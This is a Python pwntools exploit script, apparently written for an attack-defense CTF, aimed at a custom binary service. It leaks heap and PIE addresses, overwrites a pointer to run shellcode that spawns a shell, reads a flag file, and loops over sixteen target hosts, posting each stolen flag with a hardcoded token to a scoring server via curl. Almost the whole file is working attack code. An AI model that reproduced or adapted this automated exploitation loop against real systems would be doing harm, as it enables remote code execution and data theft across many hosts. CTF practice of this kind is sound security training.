from pwn import *
context(arch='amd64',os='linux',endian='little')
# context.log_level='debug'


token = '2BRWjEhzXFDV4k4curr4JuR8HWrbb57AR4XrkXXqDGVzrRGNduUAHhTCrWjv7gbC7VE5N29Fv69'
submit_url = 'http://172.16.200.6:9000/submit_flag/'
context.timeout = 5
def add(p,num,size,l,buf):
    p.send(p32(0xDEADFAFA)+'\x00')
    p.send(p32(num)+p32(size)+p32(l)+buf)
    p.recvn(5)

def delete(p,num):
    p.send(p32(0xDEADFAFA)+'\x02')
    p.send(p32(num))
    p.recvn(1)

def showinfo(p,num,n,size):
    p.send(p32(0xDEADFAFA)+'\x03')
    p.send(p32(num)+p32(n))
    p.recvn(5)
    return p.recvn(size)

def addsom(p,num,s,e):
    p.send(p32(0xDEADFAFA)+'\x04')
    p.send(p32(num)+p32(s)+p32(e))
    p.recvn(1)

def expend(p,num,n,buf):
    p.send(p32(0xDEADFAFA)+'\x08')
    p.send(p32(num)+p32(n)+buf)
    p.recvn(1)

def make(str1,str2):
    s=''
    for i in range(0,8):
        print hex(ord(str1[i])),hex(ord(str2[i]))
        print hex((ord(str1[i])-ord(str2[i])+2**8)%(2**8))
        s=s+chr((ord(str1[i])-ord(str2[i])+2**8)%(2**8))
    return s

def game_start(p):
    add(p,2**32-0x7ffffffe,8,16,p32(0x4)*4)
    add(p,0x100,1,0x100,''.ljust(0x100-len(asm(shellcraft.sh())),'\x90')+asm(shellcraft.sh()))
    #add(p,2**32-4,2**32-4
    #add(p,2**32-4,2**32-4,16,'a'*16)
    heap_addr=u64(showinfo(p,0,5,0x8))-0xb0
    pie_addr=u64(showinfo(p,0,6,0x8))-0xb80
    print 'heap addr:',hex(heap_addr)
    print 'pie addr:',hex(pie_addr)
    delete(p,0)
    add(p,2**32-0x7ffffffe,8,16,make(p64(heap_addr+0xb0),p64(pie_addr+0xcc0))*2)
    addsom(p,0,7,0)
    p.send(p32(0xDEADFAFA)+'\x03')
    p.send(p32(1)+p32(0))
    #expend(p,0,(2**32-2),'a'*0x100)
    p.sendline('echo aaa; cat flag/flag; echo bbb;')
    p.recvuntil('aaa\n') # p.interactive()
    flag = p.recvuntil('bbb')[:-4]
    return flag

def submit(flag):
    global token,submit_url
    try:
        command = 'curl {} -d "flag={}&token={}"'.format(submit_url,flag,token)
        print '-'*5+command
        os.system(command)
    except Exception,e:
        print e

if __name__=='__main__':
    ips = [i for i in range(1, 17)]
    debug=0
    while True:
        for ip in ips:
            try:
                if debug==1:
                    p=process('./apatch')
                else:
                    p=remote('172.16.%d.102' % ip,20002)
                flag = game_start(p)
                p.close()
                print 'get flag ' + flag
                submit(flag)
            except KeyboardInterrupt:
                exit(0)
            except Exception:
                p.close()
                continue
